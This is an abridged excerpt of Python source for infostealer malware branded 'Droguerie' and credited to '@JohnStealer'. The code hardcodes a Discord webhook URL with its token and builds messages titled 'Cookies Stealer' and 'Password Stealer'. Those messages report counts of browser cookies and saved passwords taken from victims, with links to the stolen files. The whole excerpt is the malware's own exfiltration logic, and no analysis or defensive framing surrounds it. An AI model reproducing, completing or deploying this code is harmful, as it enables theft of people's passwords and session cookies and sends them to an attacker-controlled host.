...
hook = "https://discordapp.com/api/webhooks/1036855487171395634/ra-nX98x2ZFn7ZWKHsHvW9k7wIpg8Mobvm6hUhLvKhpLvNw4NtW2cBtkCe00iwanVjQg"
DETECTED = False
    ...
    try:
        if name == "wpcook":
            ...
            data = {
                ...
                "embeds": [
                    {
                        "title": "Droguerie | Cookies Stealer",
                        "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie: • **{CookiCount}** Cookies Found\n:link: • [DroguerieCookies.txt]({link})",
                        "color": 14406413,
                        "footer": {
                            "text": "@JohnStealer",
                            "icon_url": "https://cdn.discordapp.com/attachments/1031884430731644998/1035795542447509585/LGBT_flag_square.svg.png"
    ...
    try:
        if name == "wppassw":
            ...
            data = {
                ...
                "embeds": [
                    {
                        "title": "Droguerie | Password Stealer",
                        "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑 • **{PasswCount}** Passwords Found\n:link: • [DrogueriePassword.txt]({link})",
                        "color": 14406413,
                        "footer": {
                            "text": "@JohnStealer",
                            "icon_url": "https://cdn.discordapp.com/attachments/1031884430731644998/1035795542447509585/LGBT_flag_square.svg.png"
